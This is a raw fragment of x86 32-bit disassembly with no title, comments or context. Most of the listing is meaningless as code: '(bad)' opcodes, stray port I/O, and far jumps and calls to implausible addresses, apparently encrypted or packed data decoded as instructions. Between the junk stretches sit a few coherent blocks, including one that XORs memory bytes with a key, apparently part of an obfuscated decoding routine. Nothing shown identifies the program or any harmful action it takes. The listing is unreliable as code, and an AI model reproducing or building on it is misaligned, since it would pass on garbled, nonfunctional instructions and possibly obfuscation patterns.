  4123e8:	mov    ds:0x30161414,al
  4123ed:	lock test eax,0xd649f7d9
  4123f3:	ins    DWORD PTR es:[edi],dx
  4123f4:	dec    ecx
  4123f5:	(bad)  
  4123f6:	inc    esp
  4123f7:	cs sbb eax,0x42d78e47
  4123fd:	push   edx
  4123fe:	repnz sbb esp,ecx
  412401:	push   ebx
  412402:	fcmovu st,st(2)
  412404:	mov    ebx,DWORD PTR [ebx+0x3cb05269]
  41240a:	mov    ecx,0x4b2f5be
  41240f:	outs   dx,DWORD PTR ds:[esi]
  412410:	call   0x5bba10de
  412415:	popf   
  412416:	mov    cl,0x54
  412418:	adc    ecx,DWORD PTR [edx-0x11]
  41241b:	out    0xba,eax
  41241d:	mov    ebx,0xeb314ac8
  412422:	mov    ah,BYTE PTR [edi+0x49823e61]
  412428:	jae    0x4123ab
  41242a:	xor    eax,esp
  41242c:	sub    BYTE PTR [esi-0x2119f8b1],dh
  412432:	popf   
  412433:	jo     0x41249b
  412435:	popf   
  412436:	test   eax,0xfbec763
  41243b:	out    dx,eax
  41243c:	adc    DWORD PTR [eax+0xd681f4b],0x80d4d26d
  412446:	sahf   
  412447:	mov    bl,0xa5
  412449:	scas   al,BYTE PTR es:[edi]
  41244a:	mov    esp,0x39a3b530
  41244f:	push   0x2ee5c321
  412454:	arpl   WORD PTR [edx],cx
  412456:	sbb    al,0x6d
  412458:	retf   0x4892
  41245b:	repnz imul edx,esp,0xffffffad
  41245f:	mov    ah,0x83
  412462:	pmaxub mm7,QWORD PTR [edi]
  412465:	sbb    BYTE PTR [esi+0x1a],al
  412468:	(bad)  
  41246a:	sbb    al,bh
  41246c:	mov    eax,0x296c113d
  412471:	and    al,0xf
  412473:	pop    ecx
  412474:	and    dl,BYTE PTR [esi]
  412476:	inc    esp
  412477:	fcomp  QWORD PTR [eax+ebx*1+0x76755c8]
  41247e:	adc    ebx,DWORD PTR [ebp-0x74]
  412481:	std    
  412482:	dec    eax
  412483:	out    0x11,al
  412485:	cmp    al,0x3f
  412487:	enter  0xfd4d,0x9f
  41248b:	arpl   WORD PTR [eax],bx
  41248d:	clc    
  41248e:	ins    BYTE PTR es:[edi],dx
  41248f:	loopne 0x412478
  412491:	aad    0x8e
  412493:	test   eax,0xbe41a534
  412498:	repnz aam 0xfc
  41249b:	inc    edi
  41249c:	push   cs
  41249d:	jle    0x4124f6
  41249f:	xor    eax,DWORD PTR [ebx]
  4124a1:	add    ecx,ebp
  4124a3:	pop    es
  4124a4:	inc    eax
  4124a5:	jne    0x4124d7
  4124a7:	jb     0x412469
  4124a9:	pop    ds
  4124aa:	sub    ebx,DWORD PTR [edx+ecx*2-0x66]
  4124ae:	repz pusha 
  4124b0:	js     0x4124ce
  4124b2:	stos   BYTE PTR es:[edi],al
  4124b3:	jo     0x4124da
  4124b5:	pop    eax
  4124b6:	fisttp WORD PTR [esp+esi*2-0x42dea281]
  4124bd:	and    dh,BYTE PTR [eax-0x2ef29fb7]
  4124c3:	mov    DWORD PTR [ebp+0xc],ecx
  4124c6:	mov    DWORD PTR [ebp-0x60],0xba699577
  4124cd:	mov    DWORD PTR [ebp-0x5c],ecx
  4124d0:	mov    DWORD PTR [ebp-0x48],0xba69957b
  4124d7:	mov    DWORD PTR [ebp-0x44],ecx
  4124da:	mov    DWORD PTR [ebp-0x38],0xba69957f
  4124e1:	mov    DWORD PTR [ebp-0x34],ecx
  4124e4:	jmp    0x412a6e
  4124e9:	xchg   edi,eax
  4124ea:	(bad)  
  4124eb:	jbe    0x412531
  4124ed:	pop    esi
  4124ee:	adc    al,0x25
  4124f0:	mov    ah,0xc9
  4124f2:	pop    es
  4124f3:	shr    BYTE PTR [eax-0x4d6d1c14],cl
  4124f9:	push   edx
  4124fa:	es push ss
  4124fc:	push   ss
  4124fd:	cmp    eax,0x60161604
  412502:	adc    bl,0xdd
  412505:	inc    eax
  412506:	jb     0x4124b6
  412508:	mov    esp,0x34e0d154
  41250d:	pop    eax
  41250e:	call   0xaa76ca3f
  412513:	lods   eax,DWORD PTR ds:[esi]
  412514:	and    ebp,edi
  412516:	pop    ds
  412517:	mov    dh,0x88
  412519:	cdq    
  41251a:	add    al,BYTE PTR [ebx+0x5e0c2614]
  412520:	das    
  412521:	push   ebp
  412522:	neg    DWORD PTR [edx-0x60c48c04]
  412528:	test   eax,0x470b85d2
  41252d:	and    BYTE PTR [ebp+ebp*8+0x49],0xa2
  412532:	je     0x412518
  412534:	test   BYTE PTR [edi],ch
  412536:	(bad)  
  412537:	shl    BYTE PTR ds:0x5dd538af,0xfa
  41253e:	lds    ebp,FWORD PTR [ebx-0x26e66faf]
  412544:	mov    al,ds:0xa954a99c
  412549:	dec    ebx
  41254a:	sbb    DWORD PTR [ebx+edx*8],0xffffff8a
  41254e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41254f:	sahf   
  412550:	ja     0x41254a
  412552:	lods   eax,DWORD PTR ds:[esi]
  412553:	push   edx
  412554:	pop    esp
  412555:	sbb    bl,BYTE PTR [esi+0x20922ae4]
  41255b:	fild   WORD PTR [ecx]
  41255d:	mov    edi,ecx
  41255f:	ret    
  412560:	and    BYTE PTR [edi+0x1b7e9c0b],cl
  412566:	int    0xa
  412568:	mov    bl,0x71
  41256a:	nop    esi
  41256d:	mov    ch,al
  41256f:	xor    al,0xd1
  412571:	fwait
  412572:	cdq    
  412573:	retf   
  412574:	into   
  412575:	shr    BYTE PTR [ecx+0x24],1
  412578:	cwde   
  412579:	loope  0x4125d1
  41257b:	cmp    ebp,DWORD PTR [esi+eiz*4]
  41257e:	xchg   edi,eax
  41257f:	cli    
  412580:	ja     0x412570
  412582:	fsubr  DWORD PTR [edi]
  412584:	mov    esi,edi
  412586:	imul   esi,DWORD PTR [edx],0x13
  412589:	mov    cl,0xbf
  41258b:	int    0x5b
  41258d:	lods   eax,DWORD PTR ds:[esi]
  41258e:	cmp    al,0x1
  412590:	pusha  
  412591:	data16 and al,0xa6
  412594:	sbb    BYTE PTR [edx+0x5a250e5e],ch
  41259a:	push   edi
  41259b:	adc    edi,DWORD PTR [ebp+0x23]
  41259e:	pop    ss
  41259f:	xor    eax,0x1dc3869
  4125a4:	sbb    al,0xaf
  4125a6:	cwde   
  4125a7:	sub    BYTE PTR [ebx-0x6a7b4bd],bl
  4125ad:	ja     0x4125b4
  4125af:	mov    eax,ds:0x50262086
  4125b4:	lods   eax,DWORD PTR ds:[esi]
  4125b5:	push   ebp
  4125b6:	data16 int3 
  4125b8:	outs   dx,DWORD PTR ds:[esi]
  4125b9:	dec    edx
  4125ba:	xchg   ebp,eax
  4125bb:	pop    ss
  4125bc:	clc    
  4125bd:	stc    
  4125be:	pop    ebp
  4125bf:	cmp    eax,0x9ad346d
  4125c4:	jmp    0x950e:0xcb21ca7b
  4125cb:	retf   0xa31b
  4125ce:	mov    al,0xbd
  4125d0:	adc    DWORD PTR [ebx+0x3e],eax
  4125d3:	mov    eax,ds:0x34f06093
  4125d8:	xchg   esi,eax
  4125d9:	ja     0x41263c
  4125db:	shl    DWORD PTR [esi+0x3848ad6d],0xfb
  4125e2:	sbb    BYTE PTR [esp+edx*2],cl
  4125e5:	mov    ebp,0x60b5feb4
  4125ea:	rcr    BYTE PTR [esp+ebx*8],cl
  4125ed:	sbb    DWORD PTR [eax],0x76e25b54
  4125f3:	jae    0x41259f
  4125f5:	jmp    0xa045:0xdbe61404
  4125fc:	push   0x9b4eddf8
  412601:	ret    
  412602:	into   
  412603:	mov    ch,BYTE PTR [ecx-0x17]
  412606:	inc    eax
  412607:	cld    
  412608:	xchg   ebx,eax
  412609:	repz mov ds:0xf606f6ca,eax
  41260f:	ja     0x41262e
  412611:	frstor [eax+esi*4]
  412614:	cmp    edx,esi
  412616:	dec    ebx
  412617:	jne    0x4125e7
  412619:	xor    DWORD PTR [esi+0x3039c9fd],edi
  41261f:	sub    ebx,DWORD PTR [edx]
  412621:	popa   
  412622:	and    BYTE PTR ds:0x28be14fc,cl
  412628:	sbb    edi,ebx
  41262a:	neg    esi
  41262c:	adc    al,0xba
  41262e:	sti    
  41262f:	aad    0x7a
  412631:	xchg   esi,eax
  412632:	stos   DWORD PTR es:[edi],eax
  412633:	lds    eax,FWORD PTR [edi+0x30]
  412636:	or     ch,BYTE PTR [ebx]
  412638:	mov    eax,ds:0x7c748c9f
  41263d:	mov    BYTE PTR [ecx-0x1759f7a3],ch
  412643:	loope  0x412661
  412645:	(bad)  
  412646:	xchg   esi,eax
  412647:	or     ch,bh
  412649:	lahf   
  41264a:	imul   eax,DWORD PTR [ecx-0x6a],0x9309ceb0
  412651:	aas    
  412652:	mov    WORD PTR [ebx],?
  412654:	arpl   WORD PTR [edx],ax
  412656:	cli    
  412657:	push   cs
  412658:	push   ebx
  412659:	jo     0x412671
  41265b:	test   BYTE PTR [ecx],dh
  41265d:	mov    ch,0xcb
  41265f:	sbb    al,0xa9
  412661:	mov    ebx,0xa0041aa
  412666:	xchg   esp,eax
  412667:	adc    DWORD PTR [eax+0x6b],ecx
  41266a:	mov    ah,0xfb
  41266c:	or     ebp,DWORD PTR [esi]
  41266e:	mov    dl,ah
  412670:	inc    ecx
  412671:	sub    al,0x82
  412673:	repz idiv ah
  412676:	push   0xf19d5de9
  41267b:	dec    ebp
  41267c:	test   BYTE PTR [ecx+0x44bdc018],dh
  412682:	jns    0x4126d6
  412684:	mov    edx,0xab6b134d
  412689:	stos   BYTE PTR es:[edi],al
  41268a:	cmp    al,cl
  41268c:	cmp    eax,0x94556246
  412691:	das    
  412692:	inc    ebx
  412693:	adc    esi,DWORD PTR [ebp-0x427bc291]
  412699:	fnstsw WORD PTR [eax-0x48d31747]
  41269f:	sub    edx,DWORD PTR [ecx]
  4126a1:	mov    edx,0xfa4db490
  4126a6:	sbb    DWORD PTR [edx+0x1cef82bf],edi
  4126ac:	sub    al,0x85
  4126ae:	cld    
  4126af:	and    DWORD PTR [ebp+0x45e9c5bd],edx
  4126b5:	jo     0x4126ec
  4126b7:	push   0x930b04ca
  4126bc:	pop    ds
  4126bd:	jbe    0x41272e
  4126bf:	dec    esp
  4126c0:	jge    0x4126be
  4126c2:	(bad)  [edi]
  4126c4:	push   cs
  4126c5:	(bad)  
  4126c6:	mov    ebx,0xeeb3736b
  4126cb:	in     al,dx
  4126cc:	pop    esi
  4126cd:	stos   DWORD PTR es:[edi],eax
  4126ce:	pushf  
  4126cf:	lahf   
  4126d0:	frstor ss:[edi+0xdb72bc8]
  4126d7:	lods   al,BYTE PTR ds:[esi]
  4126d8:	cli    
  4126d9:	inc    eax
  4126da:	mov    ebx,0x12fa5e43
  4126df:	inc    esp
  4126e0:	mov    eax,ds:0xb5c54aa8
  4126e5:	outs   dx,DWORD PTR ds:[esi]
  4126e6:	mov    BYTE PTR [ecx+eax*1-0x70a58f0e],al
  4126ed:	mov    DWORD PTR es:[ebx+0x33b32299],eax
  4126f4:	xor    edx,eax
  4126f6:	(bad)  
  4126f7:	and    DWORD PTR [edx],ebp
  4126f9:	mov    ebp,0x3e01825b
  4126fe:	stos   DWORD PTR es:[edi],eax
  4126ff:	mov    al,al
  412701:	mov    ecx,0x8e75e13c
  412706:	sahf   
  412707:	xor    eax,0x63921b33
  41270c:	push   ds
  41270d:	pop    ebx
  41270e:	idiv   al
  412710:	test   al,0xa0
  412712:	jmp    0x4b48aa56
  412717:	jns    0x412733
  412719:	sbb    al,0x23
  41271b:	xchg   ecx,eax
  41271c:	xor    al,ah
  41271e:	cmp    BYTE PTR [edx+0x71],ah
  412721:	lahf   
  412722:	jo     0x4126b3
  412724:	push   eax
  412725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412726:	leave  
  412727:	dec    edx
  412728:	jne    0x412757
  41272a:	mov    cl,0x6
  41272c:	icebp  
  41272d:	out    dx,al
  41272e:	push   edi
  41272f:	adc    BYTE PTR [ebx],bh
  412731:	stos   DWORD PTR es:[edi],eax
  412732:	rcr    BYTE PTR [ecx-0x55],1
  412735:	stos   DWORD PTR es:[edi],eax
  412736:	test   al,0x14
  412738:	xchg   BYTE PTR [edx+ecx*4+0x4f],dh
  41273c:	out    dx,eax
  41273d:	push   ds
  41273e:	ss push edi
  412740:	xor    edi,ecx
  412742:	cmp    eax,0x1d202861
  412747:	gs repnz and eax,0x4a73c193
  41274e:	mov    ebx,0xc8cee21b
  412753:	add    edx,esp
  412755:	out    0x39,al
  412757:	xchg   BYTE PTR [edx+edi*4-0x41],dl
  41275b:	push   ecx
  41275c:	stos   DWORD PTR es:[edi],eax
  41275d:	out    dx,al
  41275e:	daa    
  41275f:	add    al,0xd2
  412761:	jle    0x4127d0
  412763:	imul   DWORD PTR [ecx+0x20]
  412766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412767:	aas    
  412768:	pushf  
  412769:	fucomip st,st(2)
  41276b:	xor    BYTE PTR [edi+edi*8+0x6a],cl
  41276f:	fisubr WORD PTR [esp+eiz*4+0x6f]
  412773:	push   esp
  412774:	cwde   
  412775:	frstor [edx-0x5e]
  412778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412779:	mov    eax,0x46b68e70
  41277e:	call   0x9a17ae08
  412783:	cwde   
  412784:	xchg   ebx,eax
  412785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412786:	dec    eax
  412787:	loopne 0x412798
  412789:	enter  0xee01,0xe8
  41278d:	push   ds
  41278e:	cmp    BYTE PTR [ecx+0x14],ch
  412791:	shr    edi,0xf6
  412794:	scas   eax,DWORD PTR es:[edi]
  412795:	mov    bh,0xb7
  412797:	iret   
  412798:	pusha  
  412799:	sub    esi,DWORD PTR [edx+0x3f]
  41279c:	jnp    0x412735
  41279e:	xchg   ecx,eax
  41279f:	adc    eax,0x3487df7c
  4127a4:	xchg   edx,eax
  4127a5:	jmp    0x41276f
  4127a7:	xor    BYTE PTR [eax+0x7b],ch
  4127aa:	fsub   st(0),st
  4127ac:	pop    esp
  4127ad:	add    al,0xbc
  4127af:	inc    edx
  4127b0:	call   0xbb6300ae
  4127b5:	stos   BYTE PTR es:[edi],al
  4127b6:	mov    bh,0xe5
  4127b8:	mov    ch,0x48
  4127ba:	mov    eax,0x1a148c70
  4127bf:	xchg   ah,dh
  4127c1:	add    al,0xd7
  4127c3:	lods   al,BYTE PTR ds:[esi]
  4127c4:	jmp    0xbf23624f
  4127c9:	mov    eax,ds:0x2d4a387d
  4127ce:	sub    ah,BYTE PTR [edx-0x8e0bafd]
  4127d4:	jmp    0xab497a69
  4127d9:	xchg   dh,ah
  4127db:	addr16 je 0x4127a8
  4127de:	sbb    bl,BYTE PTR [ebx]
  4127e0:	pop    ebp
  4127e1:	sti    
  4127e2:	push   ecx
  4127e3:	addr16 dec eax
  4127e5:	and    eax,0xf1024b4e
  4127ea:	stos   BYTE PTR es:[edi],al
  4127eb:	cld    
  4127ec:	sbb    al,0x9d
  4127ee:	pop    ecx
  4127ef:	jg     0x4127f3
  4127f1:	std    
  4127f2:	repnz aaa 
  4127f4:	imul   esp,DWORD PTR [eax+edi*8+0x54226abf],0xa62e1eb7
  4127ff:	sti    
  412800:	jmp    0x4127a0
  412802:	int3   
  412803:	sbb    DWORD PTR [esp+eiz*2],ebp
  412806:	das    
  412807:	(bad)  
  412808:	sar    DWORD PTR [esi],cl
  41280a:	ins    DWORD PTR es:[edi],dx
  41280b:	in     eax,0xa8
  41280d:	mov    al,0x6c
  41280f:	aas    
  412810:	loop   0x412816
  412812:	mov    DWORD PTR [edi],0xf48f2a51
  412818:	dec    ecx
  412819:	and    bh,BYTE PTR [ebp+eax*2+0x54]
  41281d:	add    ah,dh
  41281f:	and    al,0xff
  412821:	pop    eax
  412822:	fsub   st(6),st
  412824:	sub    al,0xb
  412826:	(bad)  
  412828:	out    0xfc,eax
  41282a:	add    al,0x75
  41282c:	ja     0x41280e
  41282e:	cli    
  41282f:	lods   al,BYTE PTR ds:[esi]
  412830:	mov    eax,0x3c363b9c
  412835:	loope  0x41288e
  412837:	sahf   
  412838:	or     ebx,eax
  41283a:	into   
  41283b:	in     eax,0x4d
  41283d:	mov    edi,0x3c686f83
  412842:	jge    0x412887
  412844:	aas    
  412845:	mov    esp,0x962f54c7
  41284a:	dec    ecx
  41284b:	imul   eax,DWORD PTR [eax-0x7b44d2f8],0x39ad3a06
  412855:	adc    BYTE PTR [edx-0x69],cl
  412858:	(bad)  
  41285a:	pop    ds
  41285b:	xor    dl,al
  41285d:	xor    BYTE PTR [edi+0x2de8f4c6],cl
  412863:	jl     0x412863
  412865:	stos   BYTE PTR es:[edi],al
  412866:	cli    
  412867:	push   ds
  412868:	jb     0x4128cb
  41286a:	std    
  41286b:	ins    DWORD PTR es:[edi],dx
  41286c:	sbb    al,0x57
  41286e:	call   0xfd6469f2
  412873:	aad    0x8a
  412875:	es pop ds
  412877:	(bad)  
  412878:	aas    
  412879:	ins    BYTE PTR es:[edi],dx
  41287a:	loop   0x4128a6
  41287c:	push   esp
  41287d:	in     al,0x32
  41287f:	jp     0x4128d3
  412881:	cmp    eax,0x5f93ddd9
  412886:	lock jne 0x4128a3
  412889:	loop   0x4128b2
  41288b:	sub    eax,0x671b1b14
  412890:	xchg   BYTE PTR [ebx],cl
  412892:	add    eax,0x7ee22b3f
  412897:	adc    BYTE PTR [ecx+0x39],dh
  41289a:	push   0x6b
  41289c:	mov    ebp,DWORD PTR [eax+0x4b]
  41289f:	popa   
  4128a0:	cdq    
  4128a1:	mov    ch,ch
  4128a3:	lock or BYTE PTR [eax+0x46],0x19
  4128a8:	stos   DWORD PTR es:[edi],eax
  4128a9:	call   0xa32f:0x6f0da266
  4128b0:	test   BYTE PTR [di+0x5f82],dl
  4128b5:	xor    edx,eax
  4128b7:	repnz imul eax,DWORD PTR [ebx],0x2a
  4128bb:	adc    dl,BYTE PTR [esi]
  4128bd:	fs aam 0x2d
  4128c0:	pop    ds
  4128c1:	int    0x1e
  4128c3:	into   
  4128c4:	mov    dh,0x5b
  4128c6:	or     eax,DWORD PTR [eax-0x59747045]
  4128cc:	or     edx,DWORD PTR [eax+0x2ac544d4]
  4128d2:	mov    bh,0x28
  4128d4:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4128d6:	inc    ebp
  4128d7:	addr16 ror esp,1
  4128da:	stos   BYTE PTR es:[edi],al
  4128db:	jno    0x412950
  4128dd:	pop    ecx
  4128de:	mov    esi,0x59baefd2
  4128e3:	fcmovb st,st(2)
  4128e5:	aas    
  4128e6:	inc    esp
  4128e7:	repnz mov esp,DWORD PTR [ebp+0x56]
  4128eb:	mov    ebp,0xcf74df4c
  4128f0:	(bad)  
  4128f1:	test   al,0xec
  4128f3:	inc    eax
  4128f4:	cmp    al,0x50
  4128f6:	add    DWORD PTR [ecx+0x71],edx
  4128f9:	dec    ecx
  4128fa:	cmp    BYTE PTR [eax],0xb8
  4128fd:	push   ds
  4128fe:	jb     0x41296d
  412900:	mov    ds:0x7b2aee53,eax
  412905:	rol    BYTE PTR [edx],0xc0
  412908:	pop    esp
  412909:	imul   edi,DWORD PTR ds:0xd378b7e,0x3e
  412910:	mov    ds:0x4063e8a4,eax
  412915:	pop    edi
  412916:	fld    QWORD PTR [eax]
  412918:	dec    esi
  412919:	test   BYTE PTR [edx+0x7d],dh
  41291c:	unpckhps xmm2,XMMWORD PTR [eax+0x2]
  412920:	dec    esi
  412921:	xchg   edx,eax
  412922:	or     ecx,ecx
  412924:	jno    0x412918
  412926:	push   edi
  412927:	lds    esp,FWORD PTR [edx]
  412929:	rol    DWORD PTR [eax-0x4bee7476],1
  41292f:	mov    esi,0xbc4541d3
  412934:	jmp    0x4128f8
  412936:	ins    BYTE PTR es:[edi],dx
  412937:	mov    ch,0x5
  412939:	call   0xa5384e19
  41293e:	xor    DWORD PTR [edi],esi
  412940:	dec    edx
  412941:	inc    esp
  412942:	pop    edi
  412943:	mov    esp,ebp
  412945:	pop    eax
  412946:	fisub  DWORD PTR [esi]
  412948:	or     dh,dl
  41294a:	mov    ebx,0x24364504
  41294f:	inc    edx
  412950:	call   0xaa96:0xd52b9822
  412957:	scas   al,BYTE PTR es:[edi]
  412958:	sahf   
  412959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41295a:	xor    eax,0x7c05de84
  41295f:	std    
  412960:	in     al,dx
  412961:	mov    ah,BYTE PTR [ebx-0x21]
  412964:	adc    DWORD PTR [ecx],0xffffffbf
  412967:	jnp    0x412991
  412969:	mov    dl,0xbd
  41296b:	sub    al,0xcf
  41296d:	inc    edx
  41296e:	adc    DWORD PTR [esi],edx
  412970:	std    
  412971:	jle    0x4129a2
  412973:	dec    edx
  412974:	jecxz  0x4129ec
  412976:	adc    al,0x1c
  412978:	loop   0x412995
  41297a:	fcom   QWORD PTR [ebp-0x17]
  41297d:	int3   
  41297e:	hlt    
  41297f:	fdivr  DWORD PTR [esi+0x68]
  412982:	dec    ebx
  412983:	push   esp
  412984:	dec    edi
  412985:	ins    BYTE PTR es:[edi],dx
  412986:	sub    eax,0x34dc9fd9
  41298b:	inc    esi
  41298c:	sbb    ch,BYTE PTR [edi-0x15040f3]
  412992:	mov    bl,BYTE PTR ds:0xa0afe7ab
  412998:	aas    
  412999:	cmc    
  41299a:	into   
  41299b:	inc    ecx
  41299c:	lods   eax,DWORD PTR ds:[esi]
  41299d:	fidiv  DWORD PTR [edx+eiz*2+0x313e7393]
  4129a4:	push   ebx
  4129a5:	sbb    eax,0xd12cfabb
  4129aa:	in     eax,0xc8
  4129ac:	pop    edx
  4129ad:	les    edi,FWORD PTR [edx]
  4129af:	popa   
  4129b0:	fs in  eax,0xb7
  4129b3:	mov    dh,0x4d
  4129b5:	xchg   esi,eax
  4129b6:	inc    esi
  4129b7:	pop    edx
  4129b8:	ja     0x412a03
  4129ba:	scas   eax,DWORD PTR es:[edi]
  4129bb:	cdq    
  4129bc:	mov    ebx,0x6d4549c2
  4129c1:	mov    ds:0x1f3bb345,eax
  4129c6:	fs loope 0x4129f6
  4129c9:	sar    esp,cl
  4129cb:	test   eax,0xc2d09f10
  4129d0:	out    0x91,eax
  4129d2:	popf   
  4129d3:	dec    eax
  4129d4:	clc    
  4129d5:	outs   dx,BYTE PTR ds:[esi]
  4129d6:	push   esi
  4129d7:	cmp    eax,0xaeed9699
  4129dc:	in     al,dx
  4129dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129de:	cmp    eax,0x35549acf
  4129e3:	cmp    eax,0xb63f6601
  4129e8:	inc    edi
  4129e9:	lea    esp,[ecx+0x7a]
  4129ec:	push   ebp
  4129ed:	cmp    dh,ch
  4129ef:	cmc    
  4129f0:	es retf 0x6fcb
  4129f4:	jmp    0x9bd5:0xc187331b
  4129fb:	aam    0xb4
  4129fd:	jmp    0x1dae:0x965413f
  412a04:	add    ecx,eax
  412a06:	clc    
  412a07:	adc    DWORD PTR [eax+0x60632a20],eax
  412a0d:	ror    BYTE PTR ds:0x38b8873a,0xfd
  412a14:	inc    ebx
  412a15:	xor    cl,BYTE PTR [ebx]
  412a17:	push   ds
  412a18:	sar    BYTE PTR [ebx-0x3eba5369],1
  412a1e:	cmp    al,0xfb
  412a20:	enter  0x5029,0x24
  412a24:	xor    eax,0xf4117bac
  412a29:	push   edx
  412a2a:	stos   DWORD PTR es:[edi],eax
  412a2b:	sub    eax,edi
  412a2d:	data16 sti 
  412a2f:	or     BYTE PTR ds:0x40f80a13,ah
  412a35:	stos   BYTE PTR es:[edi],al
  412a36:	nop
  412a37:	das    
  412a38:	jae    0x4129bb
  412a3a:	sub    esp,ebx
  412a3c:	jle    0x412a66
  412a3e:	iret   
  412a3f:	int3   
  412a40:	data16 fwait
  412a42:	mov    ds:0x9d826618,al
  412a47:	fdivr  DWORD PTR [edi]
  412a49:	ret    0xfb73
  412a4c:	sbb    al,0x23
  412a4e:	sbb    bl,BYTE PTR [esp+eax*4+0x6a]
  412a52:	int    0x62
  412a54:	jo     0x412a25
  412a56:	pop    ecx
  412a57:	daa    
  412a58:	push   ds
  412a59:	out    dx,eax
  412a5a:	mov    ebp,ecx
  412a5c:	sbb    dl,BYTE PTR [eax+0x33]
  412a5f:	call   0xc395:0x281ce7e4
  412a66:	and    al,0x9e
  412a68:	jne    0x412a4a
  412a6a:	jne    0x412ad3
  412a6c:	push   ecx
  412a6d:	add    eax,0x8b08458b
  412a72:	dec    ebp
  412a73:	or     al,0xf
  412a75:	lods   al,BYTE PTR ds:[esi]
  412a76:	enter  0xc102,0xe9
  412a7a:	add    cl,BYTE PTR [ebx+0x558b084d]
  412a80:	or     al,0x33
  412a82:	mov    ecx,0xd2331ee1
  412a88:	or     eax,edx
  412a8a:	add    eax,DWORD PTR ds:0x422298
  412a90:	mov    DWORD PTR [ebp+0x14],eax
  412a93:	mov    eax,DWORD PTR [ebp+0x8]
  412a96:	mov    ecx,DWORD PTR [ebp+0xc]
  412a99:	shrd   eax,ecx,0x2
  412a9d:	shr    ecx,0x2
  412aa0:	mov    ecx,DWORD PTR [ebp+0x8]
  412aa3:	mov    edx,DWORD PTR [ebp+0xc]
  412aa6:	xor    eax,edi
  412aa8:	shl    ecx,0x1e
  412aab:	xor    edx,edx
  412aad:	or     eax,edx
  412aaf:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  412ab3:	mov    eax,DWORD PTR [ebp+0x14]
  412ab6:	xor    BYTE PTR [eax],cl
  412ab8:	mov    eax,DWORD PTR [ebp-0x60]
  412abb:	mov    ecx,DWORD PTR [ebp-0x5c]
  412abe:	shrd   eax,ecx,0x2
  412ac2:	shr    ecx,0x2
  412ac5:	mov    ecx,DWORD PTR [ebp-0x60]
  412ac8:	mov    edx,DWORD PTR [ebp-0x5c]
  412acb:	xor    eax,edi
  412acd:	shl    ecx,0x1e
  412ad0:	xor    edx,edx
  412ad2:	or     eax,edx
  412ad4:	add    eax,DWORD PTR ds:0x422298
  412ada:	mov    DWORD PTR [ebp+0x14],eax
  412add:	mov    eax,DWORD PTR [ebp-0x60]
  412ae0:	mov    ecx,DWORD PTR [ebp-0x5c]
  412ae3:	shrd   eax,ecx,0x2
  412ae7:	shr    ecx,0x2
  412aea:	mov    ecx,DWORD PTR [ebp-0x60]
  412aed:	mov    edx,DWORD PTR [ebp-0x5c]
  412af0:	jmp    0x41307a
  412af5:	xchg   ebx,eax
  412af6:	retf   
  412af7:	cs (bad) 
  412af9:	push   ds
  412afa:	adc    dl,BYTE PTR [edx]
  412afc:	mov    ds:0x683e5c87,eax
  412b01:	mov    cl,0xd3
  412b03:	sti    
  412b04:	mov    ah,0x89
  412b06:	adc    dl,BYTE PTR [esi]
  412b08:	push   ss
  412b09:	cmp    eax,0x71161604
  412b0e:	inc    edx
  412b0f:	jb     0x412af6
  412b11:	(bad)
  412b16:	sbb    BYTE PTR [ebx],dl
  412b18:	and    ecx,DWORD PTR [edi-0x68]
  412b1b:	xchg   ecx,eax
  412b1c:	xor    al,0xd5
  412b1e:	add    esi,DWORD PTR [ecx-0x35]
  412b21:	retf   
  412b22:	add    dh,al
  412b24:	cmp    DWORD PTR [ebx+0xcb93def],ebp
  412b2a:	lahf   
  412b2b:	mov    ds:0xdbb46136,eax
  412b30:	cdq    
  412b31:	or     esp,0x8df1431
  412b37:	mov    al,ds:0x917063c1
  412b3c:	mov    ah,0x1a
  412b3e:	xor    al,0xd8
  412b40:	(bad)  
  412b41:	push   ebp
  412b42:	push   ebx
  412b43:	test   BYTE PTR [esi],ch
  412b45:	fsubr  st,st(2)
  412b47:	inc    eax
  412b48:	cmp    DWORD PTR [edx+eax*4-0x5a],ecx
  412b4c:	jmp    0x412af2
  412b4e:	dec    eax
  412b4f:	cmp    eax,0xda01b416
  412b54:	mov    ch,0x65
  412b56:	mov    edi,DWORD PTR [ebx-0x62]
  412b59:	dec    esp
  412b5a:	cdq    
  412b5b:	lock scas al,BYTE PTR es:[edi]
  412b5d:	rol    BYTE PTR [esp+eax*8],1
  412b60:	sbb    esp,DWORD PTR [edi-0x27be7f77]
  412b66:	cld    
  412b67:	mov    ah,0xc0
  412b69:	arpl   WORD PTR [ebp-0x11e26108],cx
  412b6f:	lock mov esp,0xe249c07
  412b75:	call   0xc5eb44fc
  412b7a:	je     0x412bc6
  412b7c:	fistp  DWORD PTR [edx+esi*2+0x14]
  412b80:	xor    DWORD PTR [ecx-0x6e0ab6c2],esi
  412b86:	jb     0x412b2c
  412b88:	sbb    edi,edx
  412b8a:	fiadd  WORD PTR [edi]
  412b8c:	jg     0x412baf
  412b8e:	sti    
  412b8f:	into   
  412b90:	dec    esi
  412b91:	mov    al,0x27
  412b93:	in     eax,dx
  412b94:	inc    edi
  412b95:	int3   
  412b96:	or     BYTE PTR [esi+0x161d2eb1],bh
  412b9c:	mov    edi,0xfa945cef
  412ba1:	out    dx,eax
  412ba2:	push   es
  412ba3:	jbe    0x412baf
  412ba5:	xor    al,0x49
  412ba7:	pop    esi
  412ba8:	xchg   esp,eax
  412ba9:	pop    ss
  412baa:	(bad)  
  412bab:	push   ebp
  412bad:	mov    ah,0x8
  412baf:	clc    
  412bb0:	xor    DWORD PTR [esp+ebp*4],esp
  412bb3:	cmp    edx,DWORD PTR [eax]
  412bb5:	cli    
  412bb6:	xor    ebp,DWORD PTR [edx-0x6b]
  412bb9:	js     0x412bdd
  412bbb:	add    eax,0x4c0af7dd
  412bc0:	sub    al,BYTE PTR [ecx]
  412bc2:	sbb    eax,0x39cb4b5d
  412bc7:	or     BYTE PTR [ebp+0x64fd39c7],0x61
  412bce:	ret    
  412bcf:	es test cl,ah
  412bd2:	mov    eax,ds:0xeeefad67
  412bd7:	leave  
  412bd8:	mov    bh,0x89
  412bda:	ret    
  412bdb:	sub    ch,ch
